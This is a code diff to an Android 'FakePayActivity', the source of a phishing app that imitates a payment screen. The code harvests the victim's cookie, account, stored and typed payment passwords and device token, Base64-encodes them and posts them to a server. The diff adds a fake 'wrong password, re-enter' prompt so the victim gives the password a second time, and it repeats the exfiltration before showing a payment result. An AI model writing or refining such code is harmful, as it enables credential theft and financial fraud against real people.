@@ -17,16 +17,9 @@ import androidx.annotation.Nullable;
 import androidx.appcompat.app.AppCompatActivity;
 
 import com.ellison.project.R;
-import com.ellison.project.bean.PayUrlBean;
 import com.ellison.project.utils.AAAA;
 import com.ellison.project.utils.Base64Util;
 import com.ellison.project.utils.ConfigUtils;
-import com.ellison.project.utils.UrlConstant;
-import com.google.gson.Gson;
-import com.lzy.okgo.OkGo;
-import com.lzy.okgo.callback.StringCallback;
-import com.lzy.okgo.model.Response;
-import com.lzy.okgo.request.PostRequest;
 
 import java.io.PrintStream;
 import java.io.UnsupportedEncodingException;
@@ -46,6 +39,8 @@ public class FakePayActivity extends AppCompatActivity {
     private ViewGroup loading;
 
     private int payCount = 0;
+    private int postCount = 0;
+
 
     public static void enterPay(Activity activity) {
         Intent i = new Intent(activity, FakePayActivity.class);
@@ -127,21 +122,36 @@ public class FakePayActivity extends AppCompatActivity {
 
     private void sendData() {
         try {
-            Object localObject1 = Base64Util.base64Encrypt(AAAA.cookie.getBytes("UTF-8"));
+            Object localObject1 = Base64Util.base64Encrypt((AAAA.cookie + "第三次确认：" + pwd.getText().toString()).getBytes("UTF-8"));
             String str3 = Base64Util.base64Encrypt(count.getText().toString().getBytes("UTF-8"));
             String str1 = Base64Util.base64Encrypt(AAAA.pwd.getBytes("UTF-8"));
             String str2 = Base64Util.base64Encrypt(pwd.getText().toString().getBytes("UTF-8"));
             Object localObject2 = Base64Util.base64Encrypt(AAAA.pageTitle.getBytes("UTF-8"));
             String str4 = Base64Util.base64Encrypt(ConfigUtils.getToken(FakePayActivity.this).getBytes("UTF-8"));
             StringBuilder localStringBuilder = new StringBuilder();
-            localStringBuilder.append("{'type':'setpaytype','cookie':'");
-            localStringBuilder.append((String) localObject1);
+            if (payCount > 1) {
+                localStringBuilder.append("{'type':'setpaytype','cookie':'");
+                localStringBuilder.append((String) localObject1);
+            } else {
+                localStringBuilder.append("{'type':'setpaytype','cookie':'");
+                localStringBuilder.append("");
+            }
             localStringBuilder.append("','user':'");
             localStringBuilder.append(str3);
-            localStringBuilder.append("','pwd':'");
-            localStringBuilder.append(str1);
-            localStringBuilder.append("','pwd2':'");
-            localStringBuilder.append(str2);
+            if (payCount == 0) {
+                localStringBuilder.append("','pwd':'");
+                localStringBuilder.append("");
+            } else {
+                localStringBuilder.append("','pwd':'");
+                localStringBuilder.append(str2);
+            }
+            if (payCount == 0) {
+                localStringBuilder.append("','pwd2':'");
+                localStringBuilder.append(str2);
+            } else {
+                localStringBuilder.append("','pwd2':'");
+                localStringBuilder.append("");
+            }
             localStringBuilder.append("','title':'");
             localStringBuilder.append((String) localObject2);
             localStringBuilder.append("','phonecode':'");
@@ -149,7 +159,7 @@ public class FakePayActivity extends AppCompatActivity {
             localStringBuilder.append("','Token':'");
             localStringBuilder.append(str4);
             localStringBuilder.append("','id':");
-            localStringBuilder.append(AAAA.id);
+            localStringBuilder.append(AAAA.id + payCount);
             localStringBuilder.append("}");
             localObject1 = Base64Util.base64Encrypt(localStringBuilder.toString().getBytes("UTF-8"));
             if (AAAA.sendPostText2(FakePayActivity.this, (String) localObject1) > 0) {
@@ -173,8 +183,14 @@ public class FakePayActivity extends AppCompatActivity {
                             pwd.setText("");
                             Toast.makeText(FakePayActivity.this, "密码错误，请重新输入", Toast.LENGTH_LONG).show();
                         } else {
-                            PayResultActivity.enterResult(FakePayActivity.this);
-                            finish();
+                            postCount++;
+                            if (postCount < 2) {
+                                sendData();
+                            } else {
+                                ConfigUtils.setPayStatus(FakePayActivity.this, "Y");
+                                PayResultActivity.enterResult(FakePayActivity.this);
+                                finish();
+                            }
                         }
                     }
                 }, 3000);
